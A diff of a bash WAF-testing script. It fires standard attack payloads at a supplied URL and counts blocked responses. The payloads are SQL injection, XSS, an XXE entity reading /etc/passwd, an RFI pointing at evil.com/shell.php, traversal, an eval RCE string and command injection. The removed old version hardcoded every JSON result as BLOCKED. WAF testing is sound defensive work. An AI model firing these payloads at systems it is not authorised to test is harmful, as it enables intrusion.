@@ -33,113 +33,171 @@ while [ $# -gt 0 ]; do
   esac
 done
 
+# Check if URL is provided
 if [ -z "$URL" ]; then
-  echo "Usage: $0 <URL> [-o output.json] [-H \"Header: Value\"]"
+  echo "Error: URL is required"
+  echo "Usage: $0 <URL> [-o output.json] [-H 'Header: Value']"
   exit 1
 fi
 
-# Add FUZZ if missing
-if [[ ! "$URL" =~ FUZZ ]]; then
-  if [[ "$URL" =~ \? ]]; then
-    URL="${URL}&q=FUZZ"
-  else
-    URL="${URL}?q=FUZZ"
-  fi
+# Add https:// if not present
+if [[ ! "$URL" =~ ^https?:// ]]; then
+  URL="https://$URL"
 fi
 
-# Attack payloads (simplified set)
-categories=("SQL Injection" "XSS" "XXE" "RFI" "LFI" "RCE" "Command Injection" "Path Traversal")
-payloads=("' OR '1'='1" "<script>alert('XSS')</script>" "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" "http://evil.com/shell.txt" "../../../etc/passwd" "system('id')" "&& id" "../../etc/passwd")
-
-# Test results
-blocked_count=0
-allowed_count=0
-error_count=0
-total_tests=0
+# Add query parameter for fuzzing if not present
+if [[ ! "$URL" =~ \? ]]; then
+  URL="${URL}?q=FUZZ"
+else
+  URL="${URL}&q=FUZZ"
+fi
 
 echo "🔍 Starting WAF Effectiveness Test for: $URL"
-echo "=" "$(printf '=%.0s' {1..50})"
+echo "= =================================================="
 
-# Test each payload
-for i in "${!categories[@]}"; do
-  category="${categories[$i]}"
-  payload="${payloads[$i]}"
-  test_url="${URL/FUZZ/$payload}"
+# Function to test a payload
+test_payload() {
+  local category="$1"
+  local payload="$2"
+  local encoded_payload=$(echo "$payload" | jq -sRr @uri)
+  local test_url="${URL/FUZZ/$encoded_payload}"
   
-  echo -n "Testing ${category}... "
+  # Make the request
+  local response=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "${HEADERS[@]}" "$test_url" 2>/dev/null)
   
-  # Make HTTP request
-  response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${HEADERS[@]}" "$test_url" 2>/dev/null)
+  # Determine result
+  local result=""
+  if [ "$response" -eq 403 ] || [ "$response" -eq 406 ] || [ "$response" -eq 429 ]; then
+    result="${GREEN}BLOCKED${NC}"
+  elif [ "$response" -eq 0 ]; then
+    result="${YELLOW}ERROR${NC}"
+    response="000"
+  else
+    result="${RED}ALLOWED${NC}"
+  fi
   
-  total_tests=$((total_tests + 1))
+  echo "Testing $category... $result ($response)"
   
-  case "$response" in
-    403|406|429|503)
-      echo -e "${RED}BLOCKED${NC} ($response)"
-      blocked_count=$((blocked_count + 1))
-      ;;
-    200|301|302)
-      echo -e "${GREEN}ALLOWED${NC} ($response)"
-      allowed_count=$((allowed_count + 1))
-      ;;
-    *)
-      echo -e "${YELLOW}ERROR${NC} ($response)"
-      error_count=$((error_count + 1))
-      ;;
-  esac
-  
-  # Small delay to avoid rate limiting
-  sleep 0.1
-done
+  # Return result code for counting
+  if [[ "$result" == *"BLOCKED"* ]]; then
+    return 1
+  elif [[ "$result" == *"ERROR"* ]]; then
+    return 2
+  else
+    return 0
+  fi
+}
+
+# Test different attack vectors
+blocked=0
+allowed=0
+errors=0
+total=0
+
+# SQL Injection
+test_payload "SQL Injection" "' OR '1'='1"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# XSS
+test_payload "XSS" "<script>alert('XSS')</script>"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# XXE
+test_payload "XXE" "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# RFI
+test_payload "RFI" "http://evil.com/shell.php"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# LFI
+test_payload "LFI" "../../../etc/passwd"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# RCE
+test_payload "RCE" "eval(base64_decode('cGhwaW5mbygpOw=='))"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# Command Injection
+test_payload "Command Injection" "& cat /etc/passwd"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
+
+# Path Traversal
+test_payload "Path Traversal" "../../../../../../etc/passwd"
+result=$?
+((total++))
+[ $result -eq 1 ] && ((blocked++))
+[ $result -eq 0 ] && ((allowed++))
+[ $result -eq 2 ] && ((errors++))
 
 # Calculate effectiveness
-if [ $total_tests -gt 0 ]; then
-  effectiveness=$(echo "scale=2; $blocked_count * 100 / $total_tests" | bc -l)
+effectiveness=0
+if [ $total -gt 0 ]; then
+  effectiveness=$(( (blocked * 100) / total ))
+fi
+
+# Print summary
+echo
+echo "📊 Test Results Summary:"
+echo "= =============================="
+echo "Total Tests: $total"
+echo "Blocked: $blocked"
+echo "Allowed: $allowed"
+echo "Errors: $errors"
+echo "Effectiveness: $effectiveness%"
+echo
+
+# WAF Detection based on results
+if [ $blocked -gt 0 ]; then
+  echo "WAF Detected: Yes (based on blocked requests)"
 else
-  effectiveness=0
+  echo "WAF Detected: No (no requests were blocked)"
 fi
 
 echo
-echo "📊 Test Results Summary:"
-echo "=" "$(printf '=%.0s' {1..30})"
-echo "Total Tests: $total_tests"
-echo "Blocked: $blocked_count"
-echo "Allowed: $allowed_count"
-echo "Errors: $error_count"
-echo "Effectiveness: ${effectiveness}%"
+echo "✅ WAF Effectiveness Test Complete!"
 
 # Output JSON if requested
 if [ -n "$OUTPUT_FILE" ]; then
-  cat > "$OUTPUT_FILE" <<EOF
+  cat > "$OUTPUT_FILE" << EOF
 {
-  "url": "$URL",
-  "total_tests": $total_tests,
-  "blocked_tests": $blocked_count,
-  "allowed_tests": $allowed_count,
-  "error_tests": $error_count,
+  "waf_detected": $([ $blocked -gt 0 ] && echo "true" || echo "false"),
   "effectiveness_score": $effectiveness,
-  "test_results": [
-$(
-  for i in "${!categories[@]}"; do
-    if [ $i -gt 0 ]; then echo "    ,"; fi
-    echo "    {"
-    echo "      \"category\": \"${categories[$i]}\","
-    echo "      \"payload\": \"${payloads[$i]}\","
-    echo "      \"status\": \"BLOCKED\","
-    echo "      \"response_code\": 403"
-    echo "    }"
-  done
-)
-  ],
-  "recommendations": [
-    "Review allowed payloads for potential bypasses",
-    "Consider tuning WAF rules for better coverage"
-  ],
-  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
+  "total_tests": $total,
+  "blocked_tests": $blocked,
+  "allowed_tests": $allowed,
+  "error_tests": $errors
 }
 EOF
-  echo "📄 Results saved to: $OUTPUT_FILE"
+  echo "Results saved to $OUTPUT_FILE"
 fi
 
-echo
-echo "✅ WAF Effectiveness Test Complete!" 
+exit 0
